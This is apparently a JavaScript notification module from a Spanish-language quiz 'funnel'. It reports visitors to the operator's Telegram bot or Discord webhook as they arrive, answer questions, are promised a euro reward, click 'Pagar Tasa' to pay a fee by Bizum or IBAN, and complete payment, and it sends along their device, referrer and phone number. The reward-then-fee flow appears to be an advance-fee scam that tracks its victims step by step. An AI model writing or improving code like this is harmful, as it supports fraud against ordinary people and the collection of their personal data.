/**
 * Sistema de Notificaciones para Móvil
 * Envía alertas cuando los leads entran e interactúan en el embudo
 */

// Configuración - Use config-telegram.html para configurar automáticamente
// O sustituya manualmente los valores siguientes
const NOTIFICATION_CONFIG = {
  enabled: false, // Cambie a true después de configurar
  telegram: {
    botToken: '', // Token del bot de Telegram (obtenido de @BotFather)
    chatId: '' // ID del chat (obtenido vía config-telegram.html)
  },
  // Alternativa: Discord Webhook
  discord: {
    webhookUrl: '' // URL del webhook de Discord (opcional)
  }
};

/**
 * Envía notificación vía Telegram
 */
async function sendTelegramNotification(message) {
  if (!NOTIFICATION_CONFIG.enabled || !NOTIFICATION_CONFIG.telegram.botToken) {
    return;
  }

  try {
    const url = `https://api.telegram.org/bot${NOTIFICATION_CONFIG.telegram.botToken}/sendMessage`;

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: NOTIFICATION_CONFIG.telegram.chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      console.error('Error al enviar notificación Telegram');
    }
  } catch (error) {
    console.error('Error al enviar notificación:', error);
  }
}

/**
 * Envía notificación vía Discord
 */
async function sendDiscordNotification(message) {
  if (!NOTIFICATION_CONFIG.enabled || !NOTIFICATION_CONFIG.discord.webhookUrl) {
    return;
  }

  try {
    const response = await fetch(NOTIFICATION_CONFIG.discord.webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: message
      })
    });

    if (!response.ok) {
      console.error('Error al enviar notificación Discord');
    }
  } catch (error) {
    console.error('Error al enviar notificación:', error);
  }
}

/**
 * Envía notificación (intenta Telegram primero, luego Discord)
 */
function sendNotification(message) {
  if (NOTIFICATION_CONFIG.telegram.botToken) {
    sendTelegramNotification(message);
  }
  if (NOTIFICATION_CONFIG.discord.webhookUrl) {
    sendDiscordNotification(message);
  }
}

/**
 * Notifica cuando un lead entra en el embudo
 */
function notifyLeadEntered() {
  const userAgent = navigator.userAgent;
  const referrer = document.referrer || 'Directo';
  const timestamp = new Date().toLocaleString('es-ES');

  const message = `
🚀 <b>¡Nuevo Lead en el Embudo!</b>

⏰ Hora: ${timestamp}
🌐 Origen: ${referrer}
📱 Dispositivo: ${getDeviceInfo()}
  `;

  sendNotification(message);
}

/**
 * Notifica cuando un lead responde una pregunta
 */
function notifyQuestionAnswered(questionNumber, answer) {
  const timestamp = new Date().toLocaleString('es-ES');

  const message = `
✅ <b>¡Lead Interactuó!</b>

📝 Pregunta ${questionNumber} respondida
💬 Respuesta: ${answer}
⏰ Hora: ${timestamp}
  `;

  sendNotification(message);
}

/**
 * Notifica cuando un lead completa el quiz
 */
function notifyQuizCompleted(totalReward) {
  const timestamp = new Date().toLocaleString('es-ES');

  const message = `
🎉 <b>¡Lead Completó el Quiz!</b>

💰 Recompensa: €${totalReward}
⏰ Hora: ${timestamp}
  `;

  sendNotification(message);
}

/**
 * Notifica cuando un lead hace clic en "Pagar Tasa"
 */
function notifyPaymentAttempted(method, phone = null) {
  const timestamp = new Date().toLocaleString('es-ES');

  let message = `
💳 <b>¡Lead Intentó Pagar!</b>

💳 Método: ${method === 'mbway' ? 'Bizum' : 'IBAN'}
⏰ Hora: ${timestamp}
  `;

  if (phone) {
    message += `\n📱 Teléfono: +34${phone}`;
  }

  sendNotification(message);
}

/**
 * Notifica cuando el pago es confirmado
 */
function notifyPaymentConfirmed(amount, transactionId) {
  const timestamp = new Date().toLocaleString('es-ES');

  const message = `
💰 <b>¡PAGO CONFIRMADO!</b>

💵 Valor: €${amount}
🆔 Transaction ID: ${transactionId}
⏰ Hora: ${timestamp}
  `;

  sendNotification(message);
}

/**
 * Obtiene información del dispositivo
 */
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let device = 'Desktop';

  if (/mobile|android|iphone|ipad/i.test(ua)) {
    device = 'Mobile';
  } else if (/tablet|ipad/i.test(ua)) {
    device = 'Tablet';
  }

  return device;
}

/**
 * Inicializa el sistema de notificaciones
 */
function initNotifications() {
  if (!NOTIFICATION_CONFIG.enabled) return;

  // Notificar cuando la página cargue
  if (document.readyState === 'complete') {
    notifyLeadEntered();
  } else {
    window.addEventListener('load', notifyLeadEntered);
  }
}

// Inicializar cuando el script cargue
initNotifications();
